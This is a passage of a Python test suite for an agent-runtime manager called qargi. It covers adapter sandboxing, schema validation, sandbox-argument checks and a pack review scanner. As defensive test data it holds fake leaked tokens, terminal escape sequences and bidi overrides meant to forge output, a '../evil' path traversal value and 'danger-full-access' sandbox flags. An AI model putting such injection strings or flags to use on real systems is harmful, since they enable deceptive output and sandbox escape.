        self.assertEqual(json.loads(self.run_p("layout", "plaincli", "--project", "alpha")[1])["project_skills_dir"], ".fake/skills")

    def test_skills_count_for_a_project_only_when_the_extension_is_verified(self):
        with self.assertRaises(P.Unsupported):                                       # claimed by the extension, not verified yet
            P.require_skills("plaincli", "link", project="alpha")
        self.assertEqual(self.run_p("require-skills", "plaincli", "--project", "alpha")[0], 3)
        self.assertEqual(self.q("check", "skillext", "--project", "alpha")[0], 0)
        P.require_skills("plaincli", "link", project="alpha")
        self.assertEqual(self.run_p("require-skills", "plaincli", "--project", "alpha")[0], 0)
        for project in (None, "beta"):                                               # a project that did not enable it still has none
            with self.assertRaises(P.Unsupported):
                P.require_skills("plaincli", "link", project=project)
        self.assertEqual(self.run_p("require-skills", "plaincli")[0], 3)

    def test_the_launch_line_and_the_memory_directory_follow_the_composed_resources(self):
        self.put("sesext", cap_ext("sesext", "plaincli", ["resume"], adds={"capabilities": {"resume": {"value": "yes", "note": "n"}},
                                                                             "resources": {"memory": {"user_dir": "~/.fake/mem/{checkout_key}", "checkout_key": "sha256-16", "link": {"user": "dir-symlink"}}}}))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["sesext"]})
        with self.assertRaises(P.Unsupported):
            P.memory_dir("plaincli", "/some/checkout")
        d = P.memory_dir("plaincli", "/some/checkout", project="alpha", home="/h")
        self.assertRegex(d, r"^/h/\.fake/mem/[0-9a-f]{16}$")

    def test_exec_copy_leaves_no_temp_directory_behind_once_discarded(self):
        self.put("adcli", fake_runtime("adcli", adapter="adapter", adapter_verbs=["resolve"]), files={"adapter": "#!/bin/sh\necho '{}'\n"}, execs=("adapter",), exec_names="adapter")
        tmp = os.path.join(self.tmp, "tt")
        os.makedirs(tmp)
        copy, path = P.exec_copy("adcli", "adapter", tmp=tmp)
        self.assertTrue(os.access(path, os.X_OK))
        self.assertEqual(len(os.listdir(tmp)), 1)
        P.discard_exec_copy(copy)
        self.assertEqual(os.listdir(tmp), [])
        P.discard_exec_copy(copy)                                                    # gone already: no error
        for wrong in (tmp, os.path.join(tmp, "x")):                                  # not made by exec_copy: never removed
            os.makedirs(os.path.join(tmp, "x"), exist_ok=True)
            with self.assertRaises(P.ProviderError):
                P.discard_exec_copy(wrong)
            self.assertTrue(os.path.isdir(wrong))

    def test_the_cases_of_check_leave_no_temp_directory_behind(self):
        tmp = os.path.join(self.tmp, "tt")
        os.makedirs(tmp)
        d = fake_runtime("rcli", renderers={"agent": {"engine": "command", "command": ["renderers/agent"], "path": "{name}.md", "format": "markdown-frontmatter"}},
                         capabilities={"agent_definitions": {"value": "yes"}})
        self.put("rcli", d, files={"renderers/agent": RENDERER}, execs=("renderers/agent",), exec_names="renderers/agent")
        rc, out, err = self.run_p("check", "rcli", tmpdir=tmp)
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("ok   render-agent", out)
        self.assertEqual(os.listdir(tmp), [])

    def adapter_pack(self, name="adcli", verbs=("resolve", "start-session"), cloud=False):
        script = "#!/bin/sh\nprintf '{\"verb\": \"%s\", \"path\": \"%s\", \"stdin\": \"' \"$1\" \"$0\"; cat | tr -d '\\n\"'; printf '\"}\\n'\n"
        d = fake_runtime(name, adapter="adapter", adapter_verbs=list(verbs))
        if cloud:
            d["surface"] = "cloud"
        self.put(name, d, files={"adapter": script}, execs=("adapter",), exec_names="adapter")

    def test_a_library_adapter_runs_as_a_private_copy_that_is_removed_afterwards(self):
        self.adapter_pack()
        tmp = os.path.join(self.tmp, "tt")
        os.makedirs(tmp)
        rc, out, err = self.run_p("adapter-run", "adcli", "local", "resolve", data="hello", tmpdir=tmp)
        self.assertEqual(rc, 0, err)
        j = json.loads(out)
        self.assertEqual((j["verb"], j["stdin"]), ("resolve", "hello"))
        self.assertIn("qargi-exec.", j["path"])                                       # not the library's file
        self.assertNotIn(self.lib, j["path"])
        self.assertEqual(os.listdir(tmp), [])
        self.assertEqual(self.run_p("adapter-run", "adcli", "local", "resolve", "--check", tmpdir=tmp)[0], 0)
        self.assertEqual(os.listdir(tmp), [])

    def test_an_adapter_runs_in_a_scrubbed_environment_with_a_private_home_and_the_env_pass_names(self):
        seen = os.path.join(self.tmp, "adapter-env")
        d = fake_runtime("envcli", adapter="adapter", adapter_verbs=["resolve"],
                         dispatch={"mode": "command", "argv": ["envcli", "run"], "prompt": {"via": "stdin"}, "env_pass": ["FAKE_MODE", "FAKE_ABSENT"], "output": {"format": "text"}})
        self.put("envcli", d, files={"adapter": "#!/bin/sh\nenv > %s\necho '{}'\n" % seen}, execs=("adapter",), exec_names="adapter")
        self.env.update(GH_TOKEN="leak-1", SSH_AUTH_SOCK="/tmp/leak-2", PYTHONPATH="/tmp/leak-3", OPENAI_API_KEY="leak-4", FAKE_MODE="passed-on")
        tmp = os.path.join(self.tmp, "tt")
        os.makedirs(tmp)
        rc, out, err = self.run_p("adapter-run", "envcli", "local", "resolve", data="x", tmpdir=tmp)
        self.assertEqual(rc, 0, err)
        text = fread(seen)
        self.assertNotIn("leak-", text)                                                # (not on the names: the whole environment would print)
        for name in ("GH_TOKEN", "SSH_AUTH_SOCK", "PYTHONPATH", "OPENAI_API_KEY"):
            self.assertNotRegex(text, r"(?m)^%s=" % name)
        self.assertIn("FAKE_MODE=passed-on\n", text)                                   # a name the definition lists travels
        self.assertRegex(text, r"(?m)^HOME=%s/qargi-adapter\." % tmp)                  # a private home, in the run's temporary directory
        self.assertNotIn("HOME=%s\n" % self.home, text)
        self.assertEqual(os.listdir(tmp), [])                                          # and removed afterwards

    def test_an_adapter_verb_the_runtime_does_not_list_is_unsupported_and_not_called(self):
        self.adapter_pack(verbs=("resolve",))
        rc, out, err = self.run_p("adapter-run", "adcli", "local", "start-session", data="x")
        self.assertEqual((rc, out), (3, ""))
        self.assertIn("does not serve start-session", err)
        self.put("noad", fake_runtime("noad"))
        rc, _, err = self.run_p("adapter-run", "noad", "local", "resolve", data="x")
        self.assertEqual(rc, 3)
        self.assertIn("provider noad has no adapter on the local surface", err)
        self.assertEqual(self.run_p("adapter-run", "adcli", "cloud", "resolve", data="x")[0], 1)          # a surface it does not serve

    def test_a_changed_library_adapter_is_not_run(self):
        self.adapter_pack()
        with open(os.path.join(self.lib, "adcli", "adapter"), "a") as f:
            f.write("echo drift\n")
        rc, out, err = self.run_p("adapter-run", "adcli", "local", "resolve", data="x")
        self.assertEqual((rc, out), (2, ""))
        self.assertIn("changed since it was sealed", err)

    def test_a_shipped_adapter_is_found_by_the_loader_and_checked(self):
        self.assertEqual(self.run_p("adapter-run", "claude-platform", "cloud", "start-session", "--check")[0], 0)
        self.assertEqual(self.run_p("adapter-run", "claude", "cloud", "resolve", "--check")[0], 1)           # the family is not a runtime
        self.assertEqual(self.run_p("adapter-run", "claude-platform", "cloud", "dispatch-local", "--check")[0], 3)
        rc, out, err = self.run_p("adapter-run", "claude-platform", "cloud", "resolve", data=json.dumps({"surface": "cloud", "tier": "balanced", "effort": None, "profile": "build"}))
        self.assertEqual(rc, 0, err)
        self.assertEqual(json.loads(out)["model"], "claude-sonnet-5-5")

    def test_model_prints_the_id_of_a_tier_for_a_surface(self):
        rc, out, _ = self.run_p("model", "claude-platform", "cloud", "balanced")
        self.assertEqual((rc, out.strip()), (0, "claude-sonnet-5-5"))
        self.assertEqual(self.run_p("model", "claude", "cloud", "balanced")[0], 1)           # the family is not a runtime
        self.assertEqual(self.run_p("model", "plaincli", "local", "deep")[1].strip(), "my-model")
        self.assertEqual(self.run_p("model", "plaincli", "cloud", "deep")[0], 1)
        self.assertEqual(self.run_p("model", "plaincli", "local", "huge")[0], 2)


class ExtensionSchema(unittest.TestCase):
    def good(self):
        return {"schema": 2, "kind": "extension", "extension": "addon", "extends": "libcli", "surface": "local", "provides": ["resume", "skills"],
                "requires": {"capabilities": ["mcp"], "resources": ["agents"], "qargi": ">=0.2.0"},
                "adds": {"capabilities": {"resume": cell("yes"), "skills": cell("yes")}, "resources": copy.deepcopy(SKILLS_RES), "renderers": {"agent": {"engine": "map"}},
                         "dispatch": {"variants": {"fast": {"argv": ["x"]}}}, "barrier": {"kind": "hook"}, "adapter_verbs": {"resume": "verbs/resume"}}}

    def test_the_whole_shape_is_valid_and_schema_2_json_has_the_node(self):
        self.assertEqual(P.validate2(self.good(), "addon"), [])
        sch = P.schema2()
        self.assertIn("extension", sch["kinds"])
        self.assertEqual(sorted(sch["$defs"]["extension"]["properties"]["adds"]["properties"]), ["adapter_verbs", "barrier", "capabilities", "dispatch", "renderers", "resources"])

    def test_the_new_parts_are_checked(self):
        for mutate, needle in ((lambda d: d.update(surface="moon"), "surface: 'moon' is not one of local, cloud"),
                               (lambda d: d["adds"].update(color="red"), "adds.color: additional property is not allowed"),
                               (lambda d: d["requires"].update(qargi="new"), "requires.qargi: 'new' does not match"),
                               (lambda d: d["requires"].update(resources=["nosuch"]), "requires.resources[0]: 'nosuch' is not one of"),
                               (lambda d: d["requires"].update(capabilities=["nosuch"]), "requires.capabilities: unknown capability 'nosuch'"),
                               (lambda d: d["requires"].update(extra=1), "requires.extra: additional property is not allowed"),
                               (lambda d: d["adds"]["resources"]["skills"].update(project_dir="../x"), "adds.resources.skills.project_dir"),
                               (lambda d: d["adds"]["barrier"].update(kind="magic"), "adds.barrier.kind: 'magic' is not one of"),
                               (lambda d: d["adds"]["capabilities"].update(nosuch=cell("yes")), "adds.capabilities.nosuch")):
            d = self.good()
            mutate(d)
            self.assertTrue(any(needle in m for lvl, m in P.validate2(d, "addon") if lvl == "fail"), (needle, P.validate2(d, "addon")))

    def test_an_old_shape_still_validates(self):
        old = {"schema": 2, "kind": "extension", "extension": "addon", "extends": "libcli", "provides": ["resume"],
               "adds": {"capabilities": {"resume": cell("yes")}, "adapter_verbs": {"resume": "verbs/resume"}}}
        self.assertEqual(P.validate2(old, "addon"), [])


class JsonEscapedControls(LibraryBase):
    """N4: a control, escape or bidi character written as a JSON escape (\\u001b) is plain ASCII in the file but a control character in the parsed
    string. The rule applies to the parsed document of every kind (provider, catalog, extension), keys too, and everything provider.py and
    local_run.py print goes through the visible-escape helper."""
    BAD = "[\x00-\x1f\x7f-\x9f\u061c\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]"

    def docs(self):
        ext = {"schema": 2, "kind": "extension", "extension": "addon", "extends": "libcli", "provides": ["resume"],
               "adds": {"capabilities": {"resume": cell("yes")}, "adapter_verbs": {"resume": "verbs/resume"}}}
        return {"provider": runtime("mylocal"), "catalog": catalog("fam"), "extension": ext, "shipped runtime": descriptor()}

    def test_every_kind_refuses_a_control_character_in_a_value_and_in_a_key_and_the_message_carries_none(self):
        for kind, d in self.docs().items():
            name = d.get("provider") or d.get("family") or d.get("extension")
            for where in ("description", "key"):
                with self.subTest(kind=kind, where=where):
                    x = copy.deepcopy(d)
                    if where == "description":
                        x["description"] = "plain\x1b[1A\x1b[2Kruntime"
                    else:
                        x["notes\x1b[8m"] = "x"
                    got = [m for lvl, m in P.validate2(x, name) if lvl == "fail"]
                    self.assertTrue(any("control or bidi character (U+001B)" in m for m in got), got)
                    for m in got:
                        self.assertNotRegex(m, self.BAD, "a failure never carries the character")
            self.assertEqual([m for lvl, m in P.validate2(d, name) if lvl == "fail"], [], kind)

    def test_a_bidi_character_a_newline_and_a_lone_surrogate_are_refused_too(self):
        for what, text in (("bidi", "a \u202e b"), ("newline", "a\n== forged line"), ("delete", "a\x7fb"), ("c1", "a\u009bb"), ("surrogate", "a\ud800b")):
            with self.subTest(what):
                d = runtime("mylocal", description=text)
                got = [m for lvl, m in P.validate2(d, "mylocal") if lvl == "fail"]
                self.assertTrue(any("control or bidi character" in m for m in got), got)
                self.assertEqual(P.validate2(runtime("mylocal", description="caf\u00e9 \u2014 \u65e5\u672c"), "mylocal"), [])

    def test_argv_and_nested_strings_are_checked_with_their_path(self):
        d = runtime("mylocal")
        d["dispatch"]["argv"] = ["plain\x1b[8mbin", "run"]
        got = [m for lvl, m in P.validate2(d, "mylocal") if lvl == "fail"]
        self.assertTrue(any(m.startswith("dispatch.argv[0]: the value has a control or bidi character (U+001B)") for m in got), got)

    def test_import_of_a_pack_with_a_json_escaped_control_is_refused_and_nothing_is_stored(self):
        d = fake_runtime(description="plain\x1b[1A\x1b[2Kruntime")
        d["dispatch"]["argv"] = ["plain\x1b[8mbin", "run"]
        src = self.source(doc=d)
        rc, out, err = self.q("import", src)
        self.assertNotEqual(rc, 0, (out, err))
        self.assertNotRegex(out + err, "[\x00-\x09\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]")
        self.assertIn("description: the value has a control or bidi character", out + err)
        self.assertIn("dispatch.argv[0]: the value has a control or bidi character", out + err)
        self.assertFalse(os.path.exists(os.path.join(self.lib, "fakecli")))

    def test_a_stored_pack_edited_to_hold_a_json_escaped_control_is_refused_at_seal_and_shown_escaped(self):
        self.import_pack(self.source())
        path = os.path.join(self.lib, "fakecli", "definition.json")
        with open(path) as f:
            doc = json.load(f)
        doc["description"] = "plain\x1b[1A\x1b[2Kruntime"
        with open(path, "w") as f:
            json.dump(doc, f)                              # \u001b in the file: plain ASCII
        rc, out, err = self.q("seal", "fakecli")
        self.assertNotEqual(rc, 0, (out, err))
        self.assertNotIn("plan token", out)
        self.assertIn("description: the value has a control or bidi character (U+001B)", out + err)
        for verb in (("check", "fakecli"), ("show", "fakecli"), ("list",)):
            rc, out, err = self.q(*verb)
            self.assertNotRegex(out + err, "[\x00-\x09\x0b-\x1f\x7f-\x9f]", verb)

    def test_provider_py_alone_without_conformance_beside_it_refuses_and_escapes_too(self):
        alone = os.path.join(self.tmp, "alone")
        os.makedirs(alone)
        shutil.copy(os.path.join(LIB, "provider.py"), alone)
        code = ("import sys, json; sys.path.insert(0, %r); import provider as P\n"
                "d = json.loads(sys.stdin.read())\n"
                "print(P._review() is None)\n"
                "print([m for lvl, m in P.validate2(d, 'mylocal') if lvl == 'fail'])\n"
                "print(repr(P.vis('a\\x1b[2Kb\\u202e\\tc')))\n") % alone
        r = subprocess.run([sys.executable, "-I", "-c", code], input=json.dumps(runtime("mylocal", description="plain\x1b[1Aruntime")),
                           capture_output=True, text=True, cwd=self.tmp)
        self.assertEqual(r.returncode, 0, r.stderr)
        lines = r.stdout.splitlines()
        self.assertEqual(lines[0], "True")
        self.assertIn("description: the value has a control or bidi character", lines[1])
        self.assertNotIn("\x1b", lines[1])
        self.assertEqual(lines[2], repr("a\\x1b[2Kb\\u202e\tc"))

    def test_provider_py_and_local_run_print_what_a_definition_holds_through_vis(self):
        import io
        import contextlib
        sys.path.insert(0, os.path.join(LIB))
        import local_run as L
        for mod in (P, L):
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                mod.print("COMMAND=plain\x1b[8mbin", "\u202e", 3)
            self.assertEqual(buf.getvalue(), "COMMAND=plain\\x1b[8mbin \\u202e 3\n", mod.__name__)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                mod.print("qargi: a\x1b[2Kb", file=sys.stderr)
            self.assertEqual(err.getvalue(), "qargi: a\\x1b[2Kb\n", mod.__name__)


class SandboxArgs(unittest.TestCase):
    """lib/conformance/cases.py on its own: the case barrier-sandbox-args (the argv qargi local run builds for a read-only run carries the
    read-only arguments and sets their flags nowhere else) and how its gate weighs in the verdict on read_only_barrier (CAP_GATES)."""

    def setUp(self):
        from conformance import cases
        self.C = cases

    def case(self, d, name="codex"):
        return self.C.barrier_sandbox_args(d, None, name, False, False)["barrier-sandbox-args"]

    def codex(self, **disp):
        d = copy.deepcopy(shipped("codex.json"))
        d["dispatch"].update(disp)
        return d

    def argv(self, ro=("--sandbox", "read-only"), write=("--sandbox", "workspace-write"), common=()):
        return ["codex", "exec"] + list(common) + [{"class": "write", "then": list(write)}, {"class": "read-only", "then": list(ro)}]

    def test_the_shipped_codex_passes_and_names_the_arguments_of_each_class(self):
        r = self.case(shipped("codex.json"))
        self.assertEqual(r["status"], "pass", r)
        self.assertEqual(r["notes"], ["a read-only run carries --sandbox read-only (a write run: --sandbox workspace-write --add-dir /conformance/run/out "
                                      "--add-dir /conformance/run/clone/.git); that the runtime's sandbox holds is attested"])

    def test_only_the_barrier_kind_sandbox_args_has_the_case(self):
        for bar in (None, {"kind": "hook"}, {"kind": "adapter"}, "sandbox-args"):
            with self.subTest(bar):
                d = shipped("codex.json")
                d["barrier"] = bar
                self.assertEqual(self.case(d), {"status": "na", "notes": []})

    def test_a_runtime_that_is_not_a_command_runtime_fails(self):
        r = self.case(self.codex(mode="in-session"))
        self.assertEqual(r["status"], "fail")
        self.assertIn("only a command dispatch passes (dispatch.mode is \"in-session\")", r["notes"][0])

    def test_a_dispatch_qargi_local_run_would_refuse_fails_with_its_reason(self):
        for argv, needle in ((["codex", "{agent_file}", {"class": "read-only", "then": ["--sandbox", "read-only"]}], "uses {agent_file}"),
                             (["codex", {"class": "admin", "then": ["--x"]}], "{\"class\": \"admin\"}")):
            with self.subTest(needle):
                r = self.case(self.codex(argv=argv))
                self.assertEqual(r["status"], "fail")
                self.assertTrue(r["notes"][0].startswith("qargi local run would refuse the dispatch: "), r)
                self.assertIn(needle, r["notes"][0])

    def test_a_read_only_run_with_no_arguments_of_its_own_fails(self):
        for label, disp in (("no read-only group", {"argv": ["codex", "exec", {"class": "write", "then": ["--sandbox", "workspace-write"]}]}),
                            ("an empty group", {"argv": self.argv(ro=())}),
                            ("a group inside an if-group a local run never fills", {"argv": ["codex", {"if": "session_id", "then": [{"class": "read-only", "then": ["-x"]}]}]})):
            with self.subTest(label):
                r = self.case(self.codex(**disp))
                self.assertEqual(r["status"], "fail", r)
                self.assertTrue(r["notes"][0].startswith("a read-only run carries no arguments of its own"), r)

    def test_a_flag_of_the_read_only_arguments_set_again_elsewhere_fails(self):
        for label, common in (("--sandbox", ["--sandbox", "danger-full-access"]), ("--sandbox=VALUE", ["--sandbox=danger-full-access"]),
                              ("the same read-only flags", ["--sandbox", "read-only"])):
            with self.subTest(label):
                r = self.case(self.codex(argv=self.argv(common=common)))
                self.assertEqual(r["status"], "fail", r)
                self.assertIn("a read-only run also sets --sandbox outside its read-only arguments", r["notes"][0])
        r = self.case(self.codex(argv=["codex", {"if": "model", "then": ["--sandbox", "danger-full-access"]}, {"class": "read-only", "then": ["--sandbox", "read-only"]}]))
        self.assertEqual(r["status"], "fail", "a flag inside an if-group that has a value counts too")

    def test_a_key_value_setting_is_a_setting_of_its_own_per_key(self):
        ro = ("-c", "sandbox_mode=read-only")
        r = self.case(self.codex(argv=self.argv(ro=ro, write=("-c", "sandbox_mode=workspace-write"), common=["-c", "model_reasoning_effort={effort}"])))
        self.assertEqual(r["status"], "pass", "-c of another key is another setting: %s" % r)
        r = self.case(self.codex(argv=self.argv(ro=ro, common=["-c", "sandbox_mode=danger-full-access"])))
        self.assertEqual(r["status"], "fail", r)
        self.assertIn("also sets -c sandbox_mode outside", r["notes"][0])

    def test_class_argv_counts_as_the_read_only_arguments_in_either_form(self):
        for ca in (["--sandbox", "read-only"], {"read-only": ["--sandbox", "read-only"], "write": ["--sandbox", "workspace-write"]}):
            with self.subTest(ca):
                r = self.case(self.codex(argv=["codex", "exec"], class_argv=ca))
                self.assertEqual(r["status"], "pass", r)
                self.assertIn("a read-only run carries --sandbox read-only", r["notes"][0])

    def test_a_write_grant_the_read_only_run_carries_too_fails(self):
        w = ("--sandbox", "workspace-write", "--add-dir", "{out_dir}", "--add-dir", "{clone}/.git")
        for label, argv in (("in the read-only group", self.argv(ro=("--sandbox", "read-only", "--add-dir", "{clone}/.git"), write=w)),
                            ("in the common arguments", self.argv(write=w, common=["--add-dir", "{clone}/.git"])),
                            ("written FLAG=VALUE", self.argv(write=w, common=["--add-dir={clone}/.git"]))):
            with self.subTest(label):
                r = self.case(self.codex(argv=argv))
                self.assertEqual(r["status"], "fail", r)
                self.assertIn("a read-only run carries --add-dir /conformance/run/clone/.git of the write class", r["notes"][0])
        r = self.case(self.codex(argv=self.argv(ro=("--sandbox", "read-only", "--add-dir", "{run_dir}/scratch"), write=w)))
        self.assertEqual(r["status"], "pass", "a directory of its own is not the write class's grant: %s" % r)

    def test_the_write_arguments_do_not_count_against_the_read_only_run(self):
        r = self.case(self.codex(argv=self.argv(write=("--sandbox", "workspace-write", "--sandbox", "x"))))
        self.assertEqual(r["status"], "pass", r)

    # ---- CAP_GATES: a gate can only hold read_only_barrier back
    def verdict(self, results, claim="partial"):
        doc = {"capabilities": {"read_only_barrier": {"value": claim, "note": "n"}}}
        return self.C.verdicts(doc, {k: {"status": v, "notes": []} for k, v in results.items()})["read_only_barrier"]

    def test_barrier_sandbox_args_is_a_gate_of_read_only_barrier_and_backs_nothing(self):
        self.assertEqual(self.C.CAP_GATES["read_only_barrier"], ("barrier-sandbox-args",))
        self.assertNotIn("barrier-sandbox-args", [i for ids in self.C.CAP_CASES.values() for i in ids])

    def test_a_failed_gate_leaves_the_barrier_unverified_whatever_else_passed(self):
        for others in ({}, {"barrier-hook": "pass"}, {"barrier-hook": "pass", "barrier-adapter": "pass"}):
            with self.subTest(others):
                ok, why = self.verdict(dict(others, **{"barrier-sandbox-args": "fail"}))
                self.assertFalse(ok)
                self.assertEqual(why, "failed: barrier-sandbox-args")

    def test_a_passed_gate_alone_verifies_nothing_and_says_the_runtime_side_is_attested(self):
        for others in ({}, {"barrier-hook": "na", "barrier-adapter": "na"}):
            with self.subTest(others):
                ok, why = self.verdict(dict(others, **{"barrier-sandbox-args": "pass"}))
                self.assertFalse(ok)
                self.assertTrue(why.startswith("barrier-sandbox-args passed, which shows qargi's side only"), why)
                self.assertIn("qargi provider attest records a check you ran", why)
        self.assertFalse(self.verdict({"barrier-sandbox-args": "pass"}, claim="yes")[0])

    def test_a_passed_gate_beside_a_case_leaves_the_verdict_to_the_case(self):
        self.assertEqual(self.verdict({"barrier-sandbox-args": "pass", "barrier-hook": "pass"}), (True, "cases barrier-hook"))
        self.assertEqual(self.verdict({"barrier-sandbox-args": "pass", "barrier-hook": "fail"}), (False, "failed: barrier-hook"))
        ok, why = self.verdict({"barrier-sandbox-args": "pass", "barrier-hook": "skip"})
        self.assertFalse(ok)
        self.assertTrue(why.startswith("could not run: barrier-hook"), why)

    def test_a_gate_that_does_not_apply_is_no_gate(self):
        self.assertEqual(self.verdict({"barrier-sandbox-args": "na", "barrier-hook": "pass"}), (True, "cases barrier-hook"))
        ok, why = self.verdict({"barrier-sandbox-args": "na"})
        self.assertFalse(ok)
        self.assertTrue(why.startswith("no case applies to this definition"), why)

    def test_an_unclaimed_barrier_gets_no_verdict(self):
        doc = {"capabilities": {"read_only_barrier": {"value": "no", "note": "n"}}}
        self.assertEqual(self.C.verdicts(doc, {"barrier-sandbox-args": {"status": "fail", "notes": []}}), {})


class Review(unittest.TestCase):
    """lib/conformance/review.py on its own."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="review.")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        from conformance import review as R
        self.R = R

    def tree(self, files):
        d = os.path.join(self.tmp, "t%d" % len(os.listdir(self.tmp)))
        os.makedirs(d)
        for rel, data in files.items():
            p = os.path.join(d, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "wb") as f:
                f.write(data if isinstance(data, bytes) else data.encode())
        return d

    def test_stage_copies_regular_files_keeps_only_the_executable_bit_and_leaves_git_out(self):
        src = self.tree({"a.txt": "x", ".git/config": "y", "sub/run": "#!/bin/sh\n"})
        os.chmod(os.path.join(src, "sub", "run"), 0o755)
        os.chmod(os.path.join(src, "a.txt"), 0o666)
        os.symlink("a.txt", os.path.join(src, "ln"))
        dst = os.path.join(self.tmp, "staged")
        bad = self.R.stage(src, dst)
        self.assertEqual(bad, ["ln is a symbolic link, which a pack may not hold"])
        self.assertFalse(os.path.exists(os.path.join(dst, ".git")))
        self.assertFalse(os.path.exists(os.path.join(dst, "ln")))
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(dst, "a.txt")).st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(dst, "sub", "run")).st_mode), 0o700)

    def test_the_executables_of_a_definition_count_without_a_mode_or_shebang(self):
        d = self.tree({"definition.json": "{}", "r/render": "print(1)\n", "plain.txt": "text\n"})
        rv = self.R.scan(d, {"renderers": {"agent": {"engine": "command", "command": ["r/render"]}}})
        self.assertEqual([e["path"] for e in rv["executables"]], ["r/render"])
        self.assertEqual(rv["executables"][0]["why"], "the agent renderer")
        self.assertTrue(any("no executable mode" in w for w in rv["warn"]))

    def fails(self, files, definition=None):
        return self.R.scan(self.tree(files), definition)["fail"]

    def test_a_control_or_bidi_character_in_pack_text_is_a_failure_that_does_not_show_it(self):
        for what, text in (("an escape", "# harmless\x1b[2K\x1b[1A forged\n"), ("a bell", "a\x07b\n"), ("a C1 control", "a\u009bb\n"), ("a delete", "a\x7fb\n"),
                           ("a right-to-left override", "a \u202e b\n"), ("an isolate", "a \u2066 b\n"), ("a lone carriage return", "shown\roverwritten\n"),
                           ("a form feed", "a\x0cb\n")):
            with self.subTest(what):
                bad = self.fails({"definition.json": "{}", "adapter": text})
                self.assertEqual(len([m for m in bad if "control or bidi character" in m]), 1, bad)
                for m in bad:
                    self.assertEqual(self.R.vis(m), m, "the failure message carries the character itself")
        for ok_text in ("tab\there\n", "dos\r\nlines\r\n", "caf\u00e9 \u2014 \u65e5\u672c\n", "emoji \U0001F600\n"):
            self.assertEqual(self.fails({"definition.json": "{}", "adapter": ok_text}), [], repr(ok_text))

    def test_a_file_name_with_a_control_or_bidi_character_is_a_failure(self):
        for name in ("a\x1b[2Kb", "a\u202eb", "a\nb", "a\x7fb"):
            with self.subTest(name):
                rv = self.R.scan(self.tree({"definition.json": "{}", name: "x\n"}))
                self.assertTrue(any("file name" in m and "control or bidi" in m for m in rv["fail"]), rv["fail"])

    def test_vis_makes_every_such_character_visible_and_leaves_the_rest(self):
        self.assertEqual(self.R.vis("a\x1b[2Kb\u202ec\r\x7f\u009b"), "a\\x1b[2Kb\\u202ec\\r\\x7f\\x9b")
        self.assertEqual(self.R.vis("line\n\ttab caf\u00e9 \u65e5"), "line\n\ttab caf\u00e9 \u65e5")
        self.assertEqual(self.R.vis("a\udcffb"), "a\\udcffb")                    # a file name that is not UTF-8 (os.walk's surrogate escape)

    def test_the_review_lines_print_nothing_raw(self):
        d = self.tree({"definition.json": "{}", "x\x1b[2Ky": "#!/bin/sh\necho \x1b[1A\u202e\n"})
        rv = self.R.scan(d, {"adapter": "x\x1b[2Ky"})
        text = "\n".join(self.R.lines(rv, "t\x1b[2J"))
        self.assertNotRegex(text, "[\x00-\x08\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]")
        self.assertIn("x\\x1b[2Ky", text)

    def test_policy_is_the_text_only_rules_alone_and_it_is_what_a_skill_pack_meets(self):
        d = self.tree({"SKILL.md": "---\nname: s\n---\n", "ok.md": "fine\n", "bin": b"\x7fELF\x02\x01", "z": b"PK\x03\x04x", "nul": b"a\x00b", "latin": b"caf\xe9",
                       "esc.md": "a\x1bb\n", "big.md": "x" * 5})
        os.symlink("ok.md", os.path.join(d, "lnk"))
        os.mkfifo(os.path.join(d, "pipe"))
        msgs = self.R.policy(d)
        for needle in ("bin is an ELF executable", "z is a zip archive", "nul is binary", "latin is not UTF-8", "esc.md:1 has a control or bidi", "lnk is a symbolic link",
                       "pipe is not a regular file"):
            self.assertTrue(any(needle in m for m in msgs), (needle, msgs))
        self.assertEqual(len(msgs), 7, msgs)
        self.assertEqual(self.R.policy(self.tree({"SKILL.md": "x\n", "sub/refs.md": "y\n"})), [])

    def test_a_named_path_outside_the_pack_is_a_failure(self):
        d = self.tree({"definition.json": "{}"})
        rv = self.R.scan(d, {"adapter": "../evil"})
        self.assertTrue(any("is not a path inside the pack" in m for m in rv["fail"]))

    def home_lines(self, definition):
        rv = self.R.scan(self.tree({"definition.json": "{}"}), definition)
        return rv, [ln for ln in self.R.lines(rv, "t") if ln.startswith("run home")]

    def test_the_review_names_the_run_home_and_each_file_it_links_in(self):
        rv, got = self.home_lines(shipped("codex.json"))
        self.assertEqual(rv["home"], {"env": "CODEX_HOME", "dir": ".codex", "links": ["~/.codex/auth.json as auth.json"]})
        self.assertEqual(got, ["run home (dispatch.home): CODEX_HOME is RUN/home/.codex; files of your home linked into it for each run: ~/.codex/auth.json as auth.json"])
        two = {"dispatch": {"home": {"env": "FAKE_HOME", "dir": ".f", "link": [{"from": "~/.f/a.json", "to": "a.json"}, {"from": "~/.f/b", "to": "b"}]}}}
        self.assertEqual(self.home_lines(two)[1], ["run home (dispatch.home): FAKE_HOME is RUN/home/.f; files of your home linked into it for each run: "
                                                   "~/.f/a.json as a.json, ~/.f/b as b"])

    def test_a_run_home_without_links_says_none_and_a_definition_without_one_has_no_line(self):
        self.assertEqual(self.home_lines({"dispatch": {"home": {"env": "FAKE_HOME", "dir": ".f"}}})[1],
                         ["run home (dispatch.home): FAKE_HOME is RUN/home/.f; files of your home linked into it for each run: none"])
        for d in (None, {}, {"dispatch": {"mode": "command"}}, {"dispatch": {"home": "~/.f"}}, {"dispatch": "x"}):
            with self.subTest(d):
                rv, got = self.home_lines(d)
                self.assertIsNone(rv["home"])
                self.assertEqual(got, [])

    def test_the_run_home_line_names_the_files_and_never_reads_them(self):
        """The line is made from the definition's names only: a linked file's content, or where it resolves, is never in the review."""
        home = tempfile.mkdtemp(prefix="home.", dir=self.tmp)
        os.makedirs(os.path.join(home, ".codex"))
        with open(os.path.join(home, ".codex", "auth.json"), "w") as f:
            f.write("SENTINEL-sign-in-content")
        with mock.patch.dict(os.environ, {"HOME": home}):
            rv, got = self.home_lines(shipped("codex.json"))
        text = "\n".join(self.R.lines(rv, "t"))
